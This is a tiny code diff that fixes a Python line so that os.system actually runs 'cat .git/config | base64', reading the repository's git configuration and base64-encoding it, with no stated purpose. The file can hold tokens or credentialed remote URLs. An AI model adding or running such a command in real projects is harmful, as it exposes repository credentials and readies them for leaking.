@@ -1,2 +1,2 @@
 import os
-os.command("cat .git/config | base64")
+os.system("cat .git/config | base64")
